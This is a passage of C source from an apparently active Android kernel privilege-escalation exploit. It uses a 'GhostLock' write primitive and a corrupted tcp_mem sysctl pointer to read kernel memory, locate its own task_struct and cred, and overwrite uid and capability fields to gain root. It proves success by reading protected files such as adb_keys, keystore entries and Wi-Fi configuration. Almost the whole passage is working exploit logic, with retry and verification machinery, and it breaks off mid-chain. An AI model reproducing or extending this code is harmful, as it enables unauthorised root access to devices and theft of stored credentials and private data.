/* ==================================================== i746 / intent 746 修①
 * READ-CHAIN SILENT-NO-OP DETECTOR
 *
 * A GhostLock 8-byte store can return success yet not land (fact 260/692:
 * "silent no-op", retry-safe).  For a read that is observable: read_window(A)
 * first stores (A-8) into the tcp_mem ctl_table->data slot and then reads
 * /proc/sys/net/ipv4/tcp_mem, i.e. the kernel copies from that pointer.  If the
 * store no-oped, the pointer still holds the PREVIOUS window, so the read
 * returns the previous window's bytes although A changed -- a stale window.
 *
 * This was the run63b/run63 failure (intent 746): R3' asked for task+0x7f8 but
 * received exactly the R2 window (ptracer_cred==rq->curr, real_cred==rq->next);
 * in the earlier boot the same thing happened one stage earlier and R2 accepted
 * the R1 window because "is_kptr" alone cannot tell a per-cpu base from a task.
 *
 * The detector is strictly stronger than "read the same target twice and
 * require agreement" and costs ZERO extra shots in the common case:
 *   * every successful shot changes ctl_table->data to this read's A-8, so a
 *     landed read can only reproduce the previous window if two distinct kernel
 *     windows are byte-identical (still checked and retried);
 *   * a no-oped store reproduces the previous window EXACTLY, so the very first
 *     read of a new address is already classified;
 *   * on a hit the read is re-issued (same target, bounded tries); a retry that
 *     still equals the stale window is a second no-op and is rejected too;
 *   * exhaustion returns -1 -> the caller aborts cleanly with 0 further shots
 *     (never enters PERM arming or SETIDS).
 * dev_write8() refills the pmsg image (fake ebitmap_node->next=0) before every
 * shot, so a re-issued read is subject to the same invariant as any other shot.
 */
#define GLX_READ_TRIES 3

static int g_readcheck = 1;
static unsigned long g_rd_last_A;
static unsigned char g_rd_last[32];
static int g_rd_last_n;
static int g_rd_last_valid;
static int g_rd_stale_seen;
static int g_rd_retry_n;

static void read_checked_reset(void)
{
    g_rd_last_A = 0;
    g_rd_last_n = 0;
    g_rd_last_valid = 0;
    g_rd_stale_seen = 0;
    g_rd_retry_n = 0;
}

static int read_window_once(unsigned long A, unsigned char *outb)
{
#ifdef GLX_UT
    /* host-UT seam only (never present in the aarch64 build) */
    if (ut_read_hook) {
        int nn = 0;
        (void)ut_read_hook(A, outb, &nn);
        return nn;
    }
#endif
    return read_window(A, outb);
}

/* tries == 1 for the stages whose own loop already retries (R1/R2/R3C) so the
 * total shot budget cannot blow up; tries == GLX_READ_TRIES for R3P/R4/R5. */
static int read_checked_n(const char *tag, unsigned long A, unsigned char *outb,
                          int tries)
{
    int i, n = -1;

    if (!g_readcheck) return read_window_once(A, outb);
    for (i = 1; i <= tries; i++) {
        if (i > 1) usleep(P1_RETRY_GAP_US);
        n = read_window_once(A, outb);
        if (n < 16) {
            L("%s read try %d/%d: short/failed rc=%d", tag, i, tries, n);
            continue;
        }
        if (g_rd_last_valid && A != g_rd_last_A && n == g_rd_last_n &&
            memcmp(outb, g_rd_last, (size_t)n) == 0) {
            g_rd_stale_seen++;
            L("%s READ_STALE A=%016lx try %d/%d: identical to the last accepted "
              "window %016lx (store silent no-op -- ctl_table->data not "
              "updated); re-issuing", tag, A, i, tries, g_rd_last_A);
            continue;
        }
        if (i > 1) {
            g_rd_retry_n++;
            L("%s READ_RETRY_OK A=%016lx on try %d/%d", tag, A, i, tries);
        }
        g_rd_last_A = A;
        g_rd_last_n = n;
        memcpy(g_rd_last, outb, (size_t)n);
        g_rd_last_valid = 1;
        return n;
    }
    L("%s READ_STALE_GIVEUP A=%016lx after %d tries -- window unusable; "
      "caller retries, else clean abort with 0 further shots (PERM/SETIDS "
      "not reached)", tag, A, tries);
    return -1;
}

static int read_checked(const char *tag, unsigned long A, unsigned char *outb)
{
    return read_checked_n(tag, A, outb, GLX_READ_TRIES);
}

static int read_checked_once(const char *tag, unsigned long A, unsigned char *outb)
{
    return read_checked_n(tag, A, outb, 1);
}

static int read_tag_checked(const char *tag, unsigned long A, unsigned char *b)
{
    shot_tag(tag);
    return read_checked(tag, A, b);
}

/* R2 predicate: rq->curr must look like a task_struct, not like the per-cpu
 * offsets of the R1 window (the exact stale signature seen in run63). */
static int r2_task_ok(unsigned long task, unsigned long next,
                      unsigned long pco0, unsigned long pco1)
{
    if (!is_kptr(task) || (task & 7)) return 0;
    if (task == P.ent) return 0;
    if (task == pco0 || task == pco1) return 0;
    if (next == pco0 || next == pco1) return 0;
    return 1;
}

/* R3' predicate.  A non-ptraced task has ptracer_cred==0 (TracerPid 0); a
 * genuinely ptraced one carries a cred pointer.  A *task* pointer can never be
 * either, so it is the stale-window signature and must be rejected. */
static int r3p_decide(unsigned long ptracer, unsigned long real_cred,
                      unsigned long task)
{
    if (!is_kptr(real_cred) || (real_cred & 7)) return 0;
    if (real_cred == A_init_cred) return 0;
    if (real_cred == task) return 0;
    if (ptracer == 0) return 1;
    if (!is_kptr(ptracer) || (ptracer & 7)) return 0;
    if (ptracer == task) return 0;
    return 1;
}

static int w8_verified(unsigned long target, unsigned long value,
                       unsigned long read_addr, int want_off, int lo32_only,
                       const char *tag)
{
    int i;
    g_w8_attempts = 0;
    for (i = 1; i <= GLX_W8_TRIES; i++) {
        unsigned char b[16];
        unsigned long got = 0;
        int n;
        g_w8_attempts = i;
        if (w8(target, value) != 0) {
            L("%s try %d/%d: trigger failed (retry-safe class)", tag, i,
              GLX_W8_TRIES);
            continue;
        }
        g_ledger_off = 1;               /* one extra readback shot */
#ifdef GLX_UT
        if (ut_read_hook) {
            int nn = 0;
            (void)ut_read_hook(read_addr, b, &nn);
            n = nn;
        } else
#endif
        n = read_tag(tag, read_addr, b);
        if (n < want_off + 8) {
            L("%s try %d/%d: readback failed rc=%d", tag, i, GLX_W8_TRIES, n);
            continue;
        }
        got = rd64u(b, want_off);
        if (lo32_only ? ((unsigned int)got == (unsigned int)value)
                      : (got == value)) {
            if (i > 1) {
                g_w8_retry_n++;
                L("%s VERIFIED after %d tries (silent no-op recovered; "
                  "readback=%016lx want=%016lx)", tag, i, got, value);
                res("W8_RETRY_RECOVERED", 1,
                    "%s verified only on try %d/%d (readback=%016lx) -- "
                    "silent no-op re-issued, not aborted", tag, i,
                    GLX_W8_TRIES, got);
            } else {
                L("%s VERIFIED first try (readback=%016lx want=%016lx)", tag,
                  got, value);
            }
            return 0;
        }
        L("%s try %d/%d: SILENT NO-OP (target still %016lx, want %016lx)",
          tag, i, GLX_W8_TRIES, got, value);
    }
    L("%s GIVE UP after %d tries (target never matched want=%016lx)", tag,
      GLX_W8_TRIES, value);
    return -1;
}

struct capstate {
    unsigned long eff, prm, inh, bnd;
    int have_eff, have_bnd;
};
static int cap_get_self(struct capstate *c);
static unsigned long cap_bset_bits(void);
static unsigned long cap_ambient_bits(void);

/* ---- the same retry, but verified through a NON-DESTRUCTIVE oracle --------
 * 真机 fact from the intent-696 run: a GhostLock READ at address A also issues
 * the primitive's secondary store at A-8 (*(value=A-8)=target-8).  Reading
 * cred+0x38 back therefore clobbered cap_permitted (0x30) and reading
 * cred+0x40 clobbered cap_effective (0x38) -- the readback itself destroyed
 * the very fields the chain needs (WC_CAPS then saw
 * cap_effective=0xffffffe64d26c720 = ctl_table_addr-8).  The capability words
 * are therefore verified with the userspace oracle instead: capget(2) for
 * permitted/effective/inheritable, prctl(PR_CAPBSET_READ/PR_CAP_AMBIENT_IS_SET)
 * for bset/ambient.  It issues NO GhostLock shot and writes nothing.
 *   which: 0 cap_permitted | 1 cap_effective | 2 cap_bset
 *          3 cap_inheritable | 4 cap_ambient
 * Comparison is on the low 32 bits except the exact 64-bit permitted/effective
 * check (bits >= 32 come from the vmalloc high word and are not part of the
 * contract; CRED_CAPS_FULL is 0xC6). */
static int cap_oracle_match(int which, unsigned long V)
{
    struct capstate cs;
    V &= 0xffffffffUL;
    switch (which) {
    case 2:  return (cap_bset_bits() & 0xffffffffUL) == V;
    case 4:  return (cap_ambient_bits() & 0xffffffffUL) == V;
    case 0:
    case 1:
    case 3:
        if (cap_get_self(&cs) != 0) return 0;
        if (which == 0) return (cs.prm & 0xffffffffUL) == V;
        if (which == 1) return (cs.eff & 0xffffffffUL) == V;
        return (cs.inh & 0xffffffffUL) == V;
    }
    return 0;
}

static int w8_verified_cap(unsigned long target, unsigned long value,
                           const char *tag, int which)
{
    int i;
    g_w8_attempts = 0;
    for (i = 1; i <= GLX_W8_TRIES; i++) {
        g_w8_attempts = i;
        if (w8(target, value) != 0) {
            L("%s try %d/%d: trigger failed (retry-safe class)", tag, i,
              GLX_W8_TRIES);
            continue;
        }
        if (cap_oracle_match(which, value)) {
            if (i > 1) {
                g_w8_retry_n++;
                L("%s VERIFIED after %d tries (silent no-op recovered; "
                  "capability oracle now matches %016lx)", tag, i, value);
                res("W8_RETRY_RECOVERED", 1,
                    "%s verified only on try %d/%d via capget/prctl (no "
                    "readback shot, no A-8 side effect)", tag, i,
                    GLX_W8_TRIES);
            } else {
                L("%s VERIFIED first try (capability oracle matches %016lx)",
                  tag, value);
            }
            return 0;
        }
        L("%s try %d/%d: SILENT NO-OP (capability oracle does not show "
          "%016lx yet)", tag, i, GLX_W8_TRIES, value);
    }
    L("%s GIVE UP after %d tries (capability oracle never matched %016lx)",
      tag, GLX_W8_TRIES, value);
    return -1;
}

static pid_t start_daemon(void)
{
    pid_t p = fork();
    if (p != 0) return p;
    if (setcon(DOM_SHELL) != 0) L("daemon setcon failed errno=%d", errno);
    {
        int s = listen_ab(SRV_SHELL);
        if (s < 0) { L("daemon listen rc=%d", s); _exit(11); }
        for (;;) {
            int c = accept(s, NULL, NULL);
            char buf[256];
            int n;
            if (c < 0) { msleep(10); continue; }
            n = read(c, buf, sizeof(buf) - 1);
            if (n > 0) {
                struct ucred uc;
                socklen_t ul = sizeof(uc);
                buf[n] = 0;
                if (getsockopt(c, SOL_SOCKET, SO_PEERCRED, &uc, &ul) == 0 &&
                    !strncmp(buf, TOKEN, strlen(TOKEN))) {
                    char out[256];
                    int len = snprintf(out, sizeof(out),
                        "OK uid=%d euid=%d gid=%d peer=%d\n",
                        getuid(), geteuid(), getgid(), (int)uc.uid);
                    if (write(c, out, len) < 0) { }
                } else {
                    if (write(c, "DENY\n", 5) < 0) { }
                }
            }
            close(c);
        }
    }
    _exit(12);
}

static pid_t start_negative_listener(const char *name, const char *dom)
{
    pid_t p = fork();
    if (p != 0) return p;
    if (dom && setcon(dom) != 0) L("neg listener setcon %s failed errno=%d", dom, errno);
    {
        int s = listen_ab(name);
        if (s < 0) { L("neg listener %s rc=%d", name, s); _exit(21); }
        for (;;) { int c = accept(s, NULL, NULL); if (c >= 0) close(c); else msleep(10); }
    }
    _exit(22);
}

static int client_probe(const char *srv, const char *dom)
{
    pid_t p = fork();
    int st = 0;
    if (p != 0) {
        waitpid(p, &st, 0);
        return WIFEXITED(st) ? WEXITSTATUS(st) : -99;
    }
    if (dom && setcon(dom) != 0) _exit(31);
    {
        int s = connect_ab(srv);
        if (s < 0) _exit((-s > 200) ? 200 : -s);
        {
            char b[256];
            int n;
            if (write(s, TOKEN, strlen(TOKEN)) < 0) { }
            n = read(s, b, sizeof(b) - 1);
            if (n > 0) { b[n] = 0; if (strstr(b, "uid=0")) _exit(0); _exit(1); }
        }
        _exit(2);
    }
}

/* -------------------------------------------- glx_p4 capability / VR probes
 * The V8/N9V verdict no longer looks at real_cred==cred==&init_cred (that
 * form is structurally unusable, fact 572).  It is decided from:
 *   - getuid()/geteuid()/getgid()/getegid() and setfsuid(-1)/setfsgid(-1)
 *     (userspace, no GhostLock shot, no /proc dependency),
 *   - capget(2) -> permitted/effective/inheritable,
 *   - prctl(PR_CAPBSET_READ, cap) -> cap_bset bits (reads current->cred->
 *     cap_bset, i.e. exactly the field W6 writes),
 *   - self_ctx() -> SELinux context (must stay u:r:shell:s0).
 */

static int cap_get_self(struct capstate *c)
{
    struct { unsigned int version; int pid; } hdr;
    struct { unsigned int eff, prm, inh; } d[2];
    int r;

    memset(c, 0, sizeof(*c));
    memset(&hdr, 0, sizeof(hdr));
    hdr.version = _LINUX_CAPABILITY_VERSION_3;
    hdr.pid = 0;
    memset(d, 0, sizeof(d));
    r = (int)syscall(SYS_capget, &hdr, d);
    if (r != 0) return errno ? -errno : -1;
    c->eff = (unsigned long)d[0].eff | ((unsigned long)d[1].eff << 32);
    c->prm = (unsigned long)d[0].prm | ((unsigned long)d[1].prm << 32);
    c->inh = (unsigned long)d[0].inh | ((unsigned long)d[1].inh << 32);
    c->have_eff = 1;
    return 0;
}

static unsigned long cap_bset_bits(void)
{
    unsigned long v = 0;
    int i;
    for (i = 0; i <= 40; i++)
        if (prctl(PR_CAPBSET_READ, i, 0, 0, 0) == 1) v |= 1UL << i;
    return v;
}

/* glx_p10 (i552u/fact 673): capget() does not report cap_ambient;
 * PR_CAP_AMBIENT_IS_SET reads current->cred->cap_ambient. */
static unsigned long cap_ambient_bits(void)
{
    unsigned long v = 0;
    int i;
    for (i = 0; i <= 40; i++)
        if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, i, 0, 0) == 1)
            v |= 1UL << i;
    return v;
}

/* forward: defined with the delivery layer, used by the N9-fallback tail */
static int restore_enforce_selinuxfs(const char *why);

/* Own SELinux context.  /proc/self/attr/current first (what setcon writes),
 * SO_PEERSEC on a socketpair as fallback (fact 536 used it successfully). */
static int self_ctx(char *out, int n)
{
    int r;

    if (n < 2) return -1;
    out[0] = 0;
    r = rd_file("/proc/self/attr/current", out, n);
    if (r > 0) return r;
    {
        int sv[2];
        socklen_t l;
        char b[160];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) return -errno;
        memset(b, 0, sizeof(b));
        l = sizeof(b) - 1;
        r = getsockopt(sv[0], SOL_SOCKET, SO_PEERSEC, b, &l);
        close(sv[0]); close(sv[1]);
        if (r != 0) return -errno;
        if (l > (socklen_t)(n - 1)) l = (socklen_t)(n - 1);
        memcpy(out, b, l);
        out[l] = 0;
        while (l > 0 && (out[l-1] == '\n' || out[l-1] == '\r' || out[l-1] == 0))
            out[--l] = 0;
        return (int)l;
    }
}

/* --------------------------------------------------------------- VR target
 * The planner's correction (intent 576): never hard-code one path.  Probe a
 * candidate list at runtime and pick the first regular 0600 file that the
 * shell identity cannot read.  Preference order: root-owned first (owner path,
 * no capability needed), then any non-shell owner (capability path -- this is
 * the variant that additionally proves cap_effective/cap_bset).
 * If nothing qualifies the run reports VR_TARGET_UNKNOWN and does NOT count it
 * as a root failure. */
static const char *const VR_CANDIDATES[] = {
    "/data/system/entropy.dat",
    "/data/system/users/0/settings_secure.xml",
    "/data/system/users/0/settings_fingerprint.xml",
    "/data/misc/keystore/user_0/.tmp",
    "/data/misc/wifi/WifiConfigStore.xml",
    "/data/misc/adb/adb_keys",
    "/data/tombstones/tombstone_00",
    NULL
};
#define VR_NCAND ((int)(sizeof(VR_CANDIDATES)/sizeof(VR_CANDIDATES[0])) - 1)
static int g_vr_pre_rc[VR_NCAND];       /* shell-side read rc before the cred stage */
static int g_vr_pre_done;

static int vr_eligible(const char *p, struct stat *st, int need_root)
{
    if (stat(p, st) != 0) return 0;
    if (!S_ISREG(st->st_mode)) return 0;
    if ((st->st_mode & 0777) != 0600) return 0;
    if (st->st_size <= 0) return 0;
    if (st->st_uid == 2000) return 0;           /* shell never qualifies */
    if (need_root && st->st_uid != 0) return 0;
    return 1;
}

/* Pre-root (uid 2000) probe of every candidate: by construction these must be
 * unreadable for the shell identity.  Result is re-used by the VR assertion. */
static void vr_pre_probe(void)
{
    int i;
    for (i = 0; i < VR_NCAND; i++) {
        char b[8];
        g_vr_pre_rc[i] = rd_file(VR_CANDIDATES[i], b, sizeof(b));
        L("VR pre(root-less uid=%d) %s rc=%d", getuid(), VR_CANDIDATES[i],
          g_vr_pre_rc[i]);
    }
    g_vr_pre_done = 1;
    /* i730: pose baseline for the identity invariants.  prctl(2) only. */
    g_bnd_pre = cap_bset_bits();
    g_secbits_pre = (unsigned long)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0);
    g_pose_pre_done = 1;
    L("VR pose pre uid=%d bnd=%#lx securebits=%#lx", getuid(), g_bnd_pre,
      g_secbits_pre);
}

/* Pick the VR target after the cred stage.  Returns the static-list index, or
 * -1 for a dynamically scanned /data/anr file, or -2 when nothing qualifies.
 * fact 584: /data/anr is shell-readable and its 0600 anr_data_file entries are
 * shell-READ-allowed by policy, so mode 0600 + owner!=2000 is still a pure DAC
 * wall for uid2000 and a valid fallback. */
static int vr_scan_anr(char *out, int n, struct stat *st_out, int *root_owned)
{
    DIR *d = opendir("/data/anr");
    struct dirent *e;
    if (!d) return -1;
    while ((e = readdir(d)) != NULL) {
        char p[512];
        struct stat st;
        if (e->d_name[0] == '.' &&
            (e->d_name[1] == 0 || (e->d_name[1] == '.' && e->d_name[2] == 0)))
            continue;
        snprintf(p, sizeof(p), "/data/anr/%s", e->d_name);
        if (!vr_eligible(p, &st, 0)) continue;
        snprintf(out, n, "%s", p);
        *st_out = st;
        *root_owned = (st.st_uid == 0);
        closedir(d);
        return 0;
    }
    closedir(d);
    return -1;
}

static int vr_pick(char *out, int n, struct stat *st_out, int *root_owned,
                   int *pre_rc)
{
    int i;
    for (i = 0; i < VR_NCAND; i++) {
        struct stat st;
        if (!vr_eligible(VR_CANDIDATES[i], &st, 0)) continue;
        if (g_vr_pre_done && g_vr_pre_rc[i] >= 0) continue;   /* shell could read it */
        snprintf(out, n, "%s", VR_CANDIDATES[i]);
        *st_out = st;
        *root_owned = (st.st_uid == 0);
        *pre_rc = g_vr_pre_done ? g_vr_pre_rc[i] : -999;
        return i;
    }
    if (vr_scan_anr(out, n, st_out, root_owned) == 0) {
        *pre_rc = -999;       /* not pre-probed; 0600+owner!=2000 is DAC-proof */
        return -1;
    }
    return -2;
}

/* P2 (intent 598): "no fixture" is not evidence of root.  This used to be
 * res(...,1,...), i.e. a PASS; it is now a FAIL (g_fails++, delivery returns
 * -1, RESULT cannot be PASS) and the verdict is spelled out on the RESULT
 * line as vr=UNKNOWN.  It stays distinct from a real root failure so the
 * operator can tell "no fixture on this build" from "root did not work". */
static void vr_report_unknown(void)
{
    g_vr_verdict = "UNKNOWN";
    res("VR_TARGET_UNKNOWN", 0,
        "no regular 0600 non-shell file among %d candidates or /data/anr "
        "(counted as NOT verified, hint 483 #2)", VR_NCAND);
    L("VR_TARGET_UNKNOWN candidates exhausted -- no VR evidence this run");
}

/* Post-exec probe: runs in the re-exec'd child (uid0, shell domain, capability
 * sets recomputed by cap_bprm_set_creds).  It re-checks cap_bset AFTER the exec
 * boundary -- fact 572: execve rebuilds pP'/pE' from cap_bset, so an exec is
 * the only honest test that W6 landed. */
static int vr_exec_probe_child(const char *path)
{
    struct capstate cs;
    char ctx[160] = {0};
    char rb[64];
    int fd, got, uid, euid, gid, egid, ok;

    cap_get_self(&cs);
    cs.bnd = cap_bset_bits();
    cs.have_bnd = 1;
    self_ctx(ctx, sizeof(ctx));
    uid = getuid(); euid = geteuid(); gid = getgid(); egid = getegid();
    memset(rb, 0, sizeof(rb));
    fd = open(path, O_RDONLY);
    got = fd >= 0 ? read(fd, rb, sizeof(rb) - 1) : -1;
    if (fd >= 0) close(fd);
    printf("VREXEC uid=%d euid=%d gid=%d egid=%d eff=%#lx prm=%#lx inh=%#lx "
           "bnd=%#lx fd=%d got=%d ctx=%s\n",
           uid, euid, gid, egid, cs.eff, cs.prm, cs.inh, cs.bnd, fd, got, ctx);
    /* P3 (intent 598): cap_permitted must be there too.  fact 595 (C.53
     * cap_bprm_set_creds): after execve pP' = pE' = cap_bset|cap_inheritable,
     * so permitted is rebuilt from bset.  Without this assertion a "bset is
     * right but exec took a degraded path (pE'=0)" failure would look like a
     * plain capability miss; with it the post-exec recomputation is proven
     * directly. */
    ok = uid == 0 && euid == 0 && gid == 0 && egid == 0 &&
         (cs.eff & CRED_CAP_BITS) == CRED_CAP_BITS &&
         (cs.prm & CRED_CAP_BITS) == CRED_CAP_BITS &&
         (cs.bnd & CRED_CAP_BITS) == CRED_CAP_BITS &&
         got > 0 && strstr(ctx, DOM_SHELL) != NULL;
    printf("VREXEC|RESULT=%s\n", ok ? "PASS" : "FAIL");
    fflush(stdout);
    return ok ? 0 : 1;
}

/* Parent side: exec /proc/self/exe --vr-exec-probe <path> and report. */
static int vr_exec_check(const char *path, char *out, int cap)
{
    int pfd[2], st = -99, n, tot = 0;
    pid_t pid;

    out[0] = 0;
    if (pipe(pfd) != 0) return -1;
    pid = fork();
    if (pid == 0) {
        char *argv[4];
        close(pfd[0]);
        if (dup2(pfd[1], 1) < 0 || dup2(pfd[1], 2) < 0) _exit(91);
        if (pfd[1] != 1 && pfd[1] != 2) close(pfd[1]);
        argv[0] = (char *)"/proc/self/exe";
        argv[1] = (char *)"--vr-exec-probe";
        argv[2] = (char *)path;
        argv[3] = NULL;
        execv("/proc/self/exe", argv);
        printf("VREXEC exec-failed errno=%d\n", errno);
        fflush(stdout);
        _exit(90);
    }
    close(pfd[1]);
    while ((n = read(pfd[0], out + tot, cap - 1 - tot)) > 0) {
        tot += n;
        if (tot >= cap - 1) break;
    }
    close(pfd[0]);
    out[tot] = 0;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : -99;
}

/* ------------------------------------------------------------- the chain */
struct chain {
    unsigned long task, real_cred, cred;
    unsigned char state[16];
    unsigned long ent;
    unsigned long p0;
    int pco_cpu;
};

/* ================================================ glx_p11 (intent 696 (C))
 * Independent uid0 forensics, produced by THIS process right after SETIDS and
 * BEFORE any stop stage can exit (hint 483: never trust our own RESULT line).
 * The fixture is the 0600 system:system file DEV_VR_TARGET: a successful
 * open+read by this task requires uid=0 AND CAP_DAC_OVERRIDE, so it cannot be
 * faked by a numeric uid change alone.  The SELinux label is read from
 * /proc/self/attr/current -- it must still be u:r:shell:s0.
 * Note: this is a plain syscall path, no GhostLock shot. */
static void perm_forensics(void)
{
    struct stat st;
    char hex[65];
    char stbuf[4096];
    char ctx[160] = {0};
    struct capstate cs;
    int hs, sr, uid;

    memset(&st, 0, sizeof(st));
    memset(hex, 0, sizeof(hex));
    memset(&cs, 0, sizeof(cs));
    uid = (int)getuid();
    hs = sha256_file(DEV_VR_TARGET, hex);
    L("PERMSET_FORENSICS path=%s sha256_rc=%d sha256=%s uid=%d",
      DEV_VR_TARGET, hs, hs == 0 ? hex : "-", uid);
    L("PERMSET_FORENSICS expect fact-668 sha256=789a3e95... (512B 0600 "
      "system:system; shell cannot even stat it)");
    if (stat(DEV_VR_TARGET, &st) == 0)
        L("PERMSET_FORENSICS stat mode=%04o uid=%d gid=%d size=%lld",
          (unsigned int)(st.st_mode & 07777), (int)st.st_uid, (int)st.st_gid,
          (long long)st.st_size);
    else
        L("PERMSET_FORENSICS stat failed errno=%d", errno);
    sr = rd_file("/proc/self/status", stbuf, sizeof(stbuf));
    if (sr > 0) {
        const char *p;
        char dump[900];
        int dn = 0;
        dump[0] = 0;
        for (p = stbuf; *p && dn < (int)sizeof(dump) - 120; p++) {
            if ((p == stbuf || p[-1] == '\n') &&
                (!strncmp(p, "Uid:", 4) || !strncmp(p, "Gid:", 4) ||
                 !strncmp(p, "CapEff:", 7) || !strncmp(p, "CapBnd:", 7) ||
                 !strncmp(p, "CapPrm:", 7))) {
                const char *e = strchr(p, '\n');
                int l = e ? (int)(e - p) : (int)strlen(p);
                if (dn + l + 2 < (int)sizeof(dump)) {
                    memcpy(dump + dn, p, (size_t)l);
                    dn += l;
                    dump[dn++] = ' ';
                    dump[dn] = 0;
                }
                if (e) p = e;
            }
        }
        L("PERMSET_FORENSICS /proc/self/status: %s", dump);
    } else {
        L("PERMSET_FORENSICS /proc/self/status rc=%d", sr);
    }
    self_ctx(ctx, sizeof(ctx));
    cap_get_self(&cs);
    L("PERMSET_FORENSICS ctx=%s uid=%d euid=%d gid=%d CapEff=%#lx CapBnd=%#lx",
      ctx, uid, (int)geteuid(), (int)getgid(), cs.eff, cap_bset_bits());
    res("PERMSET_FORENSICS",
        uid == 0 && geteuid() == 0 && hs == 0 &&
        strlen(hex) == 64 && strstr(ctx, DOM_SHELL) != NULL,
        "uid0 read of %s rc=%d sha256=%.16s... ctx=%s (needs uid0 + "
        "DAC_OVERRIDE; shell would get EACCES)", DEV_VR_TARGET, hs,
        hs == 0 ? hex : "-", ctx);
    printf("GLX|PERMSET uid=%d euid=%d gid=%d egid=%d CapEff=%#lx "
           "CapBnd=%#lx ctx=%s entropy_sha256=%s\n",
           uid, (int)geteuid(), (int)getgid(), (int)getegid(), cs.eff,
           cap_bset_bits(), ctx, hs == 0 ? hex : "-");
}

static int do_chain(struct chain *C)
{
    unsigned char b[32];
    unsigned long long pco[8];
    int n;
    unsigned long p0_saved = C->p0;   /* i463: main sets C.p0 before the call;
                                       * the blanket memset below used to wipe
                                       * it, which made N9/N10 unreachable
                                       * ("no P0") on every run. */

    memset(C, 0, sizeof(*C));
    C->p0 = p0_saved;
    memset(pco, 0, sizeof(pco));
    read_checked_reset();          /* i746: per-chain stale-window state */

    /* ---------------- R1: __per_cpu_offset[0..1] ----------------
     * glx_p7 fix 2 (fact 628): a pseudo-pco (0x2c257 / 0x4237e) is a read of a
     * wrong address (bad D).  One ledger tag, up to P1_RETRY_MAX real reads;
     * the page-alignment/stride predicate is the gate, so a wrong D can only
     * end in a safe CHAIN_ABORT, never in a shot at a bogus target. */
    {
        int ok = 0, tries = 0;
        shot_tag("R1");                 /* one ledger tag, N real reads */
        for (tries = 1; tries <= P1_RETRY_MAX; tries++) {
            if (tries > 1) usleep(P1_RETRY_GAP_US);
            if (read_checked_once("R1", A_pco, b) < 16) continue;
            pco[0] = rd64u(b, 0); pco[1] = rd64u(b, 8);
            ok = pco_pair_ok(pco[0], pco[1]);
            if (ok) break;
            L("R1_PCO try %d/%d: pco0=%016llx pco1=%016llx (retrying; a bogus "
              "D yields non-page-aligned / non-stride values)",
              tries, P1_RETRY_MAX, pco[0], pco[1]);
        }
        L("R1 pco0=%016llx pco1=%016llx (struct ent=%016lx) tries=%d/%d",
          pco[0], pco[1], P.ent, tries, P1_RETRY_MAX);
        res("R1_PCO", ok, "pco0=%llx pco1=%llx tries=%d/%d", pco[0], pco[1],
            tries, P1_RETRY_MAX);
        if (g_fails) return -1;
    }

    /* ---------------- R2: rq->curr = our own task ---------------- */
    C->pco_cpu = g_qemu ? 0 : g_t_cpu;
    /* P1: we only ever read rq[T's CPU]->curr, and that CPU must not be main's
     * CPU (otherwise the read would return main, not T).  Identity is proven
     * by R3C below; this is the cheap structural precondition.
     * item ⑤: re-sampled up to P1_RETRY_MAX times (main can migrate between
     * the pin and this check) before it is allowed to abort. */
    {
        int ok = 0, tries = 0;
        for (tries = 1; tries <= P1_RETRY_MAX; tries++) {
            int mc = sched_getcpu();
            ok = g_qemu || (C->pco_cpu == g_t_cpu && g_t_cpu != mc);
            if (ok) break;
            L("R2_CPU_PIN try %d/%d: rq cpu=%d t_cpu=%d main_cpu=%d (retrying)",
              tries, P1_RETRY_MAX, C->pco_cpu, g_t_cpu, mc);
            usleep(P1_RETRY_GAP_US);
        }
        res("R2_CPU_PIN", ok, "rq cpu=%d t_cpu=%d main_cpu=%d tries=%d/%d",
            C->pco_cpu, g_t_cpu, sched_getcpu(), tries, P1_RETRY_MAX);
        if (g_fails) return -1;
    }
    {
        unsigned long rq = A_rq + rq_curr_off + (unsigned long)pco[C->pco_cpu];
        int ok = 0, tries = 0;
        shot_tag("R2");                 /* one ledger tag, N real shots */
        for (tries = 1; tries <= P1_RETRY_MAX; tries++) {
            if (tries > 1) usleep(P1_RETRY_GAP_US);
            n = read_checked_once("R2", rq, b);
            if (n < 16) continue;
            C->task = rd64u(b, 0);
            ok = r2_task_ok(C->task, rd64u(b, 8), pco[0], pco[1]);
            if (ok) break;
        }
        L("R2 cpu=%d rq=%016lx curr=%016lx next=%016lx tries=%d/%d",
          C->pco_cpu, rq, C->task, rd64u(b, 8), tries, P1_RETRY_MAX);
        res("R2_CURR", ok, "curr=%016lx cpu=%d tries=%d/%d", C->task,
            C->pco_cpu, tries, P1_RETRY_MAX);
        if (g_fails) return -1;
    }
    if (g_dev && !g_victim_task) g_victim_task = C->task;

    /* ---------------- R3': task+ptracer_cred ---------------- */
    {
        unsigned long a = C->task + off_ptracer;
        unsigned long ptracer;
        if (read_tag_checked("R3P", a, b) < 16) {
            res("R3P", 0, "read failed or stale window survived retries");
            return -1;
        }
        ptracer = rd64u(b, 0);
        C->real_cred = rd64u(b, 8);
        L("R3' ptracer_cred=%016lx real_cred=%016lx", ptracer, C->real_cred);
        res("R3P_PTRACER", r3p_decide(ptracer, C->real_cred, C->task),
            "ptracer_cred=%lx real_cred=%lx (0 or cred-like; a task ptr is "
            "the stale-window signature)", ptracer, C->real_cred);
        if (g_fails) return -1;
    }
    /* ---------------- R3P: comm identity ---------------- */
    {
        unsigned long a = C->task + off_comm;
        char name[17] = {0};
        int ok = 0, tries = 0;
        /* item ⑤: re-read the SAME comm up to P1_RETRY_MAX times before the
         * fail-closed abort.  A wrong comm can never become right by retrying,
         * so a genuine foreign rq->curr still aborts (0 shots fired). */
        shot_tag("R3C");                /* one ledger tag, N real shots */
        for (tries = 1; tries <= P1_RETRY_MAX; tries++) {
            if (tries > 1) usleep(P1_RETRY_GAP_US);
            n = read_checked_once("R3C", a, b);
            if (n < 16) continue;
            memcpy(name, b, 8); memcpy(name + 8, b + 8, 8);
            name[16] = 0;
            /* P1: a non-empty comm is NOT identity.  Only T's PR_SET_NAME nonce
             * counts; anything else aborts before the first cred write. */
            ok = comm_is_t_nonce(name);
            if (ok) break;
        }
        if (tries > 1)
            L("R3c identity tries=%d/%d final comm[0..15]='%.16s'", tries,
              P1_RETRY_MAX, name);
        r3c_check(name);
        if (g_fails) return -1;
    }
    /* ---------------- R4: cred euid/egid/fsuid/fsgid ---------------- */
    {
        unsigned long a = C->real_cred + cred_euid;
